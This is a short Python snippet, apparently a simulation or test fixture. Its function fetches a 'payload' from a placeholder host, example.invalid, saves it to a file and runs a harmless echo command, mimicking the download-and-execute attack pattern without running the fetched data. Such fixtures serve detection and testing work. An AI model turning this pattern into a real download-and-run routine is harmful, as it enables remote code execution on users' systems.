import subprocess
import requests


def simulated_download_execute() -> None:
    data = requests.get("http://example.invalid/payload", timeout=1).text
    open("payload.txt", "w").write(data)
    subprocess.run(["echo", "simulated"])
